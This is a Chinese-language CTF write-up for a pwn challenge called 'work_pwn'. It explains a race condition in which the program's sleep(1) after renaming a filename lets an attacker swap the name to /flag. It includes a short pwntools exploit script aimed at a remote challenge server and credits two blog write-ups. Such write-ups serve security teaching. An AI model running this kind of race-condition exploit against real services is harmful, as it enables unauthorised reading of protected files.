# work_pwn

> 分类：Pwn

## 题目描述

条件竞争题。程序会强制改名读入的 filename，并执行 `sleep(1)`，利用时间窗口把 name 改成 `/flag`。

## 考察知识点

- 条件竞争
- 文件名篡改

## 解法

分析代码发现是条件竞争：读入 filename 后会强制改名，此时执行 `sleep(1)`。利用这个时间窗口，把 name 修改成 `/flag` 发送上去。

```python
from pwn import *
context(arch="amd64", os="linux")
context.log_level = "debug"

io1 = remote('39.106.48.123', 42877)

io1.sendline(str(3))
io1.sendline(str(1))
io1.recv()

sleep(0.1)
io1.sendline(str(1))
io1.sendline(str(1))
io1.recvuntil("Input Name : ")
io1.sendline(b'./flag' + 2*b'\x00')
sleep(1)
io1.recv()
```

（另一 exp 见原 writeup，核心是 sendline('3') 后的一系列操作，最终把 filename 换成 `/flag` 读取）

## 参考答案

（flag 通过条件竞争篡改 filename 读取 `/flag`）

## 来源

- 作者：S1gMa | https://www.cnblogs.com/S1gMa/p/17007231.html
- 作者：Shark-one | https://blog.csdn.net/xccwxy/article/details/128664878
